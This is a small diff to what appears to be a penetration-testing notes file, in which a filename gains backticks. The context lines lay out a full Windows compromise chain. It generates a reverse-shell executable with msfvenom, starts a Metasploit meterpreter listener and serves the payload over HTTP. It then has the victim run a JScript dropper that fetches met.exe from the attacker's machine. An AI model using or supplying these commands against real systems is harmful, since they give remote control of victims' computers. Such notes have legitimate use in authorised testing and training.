@@ -184,7 +184,7 @@ End Sub
 1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f exe -o met.exe`
 2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
 3. `python3 -m http.server <port of your choice>`
-4. On victim, save this as <filename>.js and run it:
+4. On victim, save this as `<filename>.js` and run it:
 ```
 var url = "http://<kali ip>:<http port>/met.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
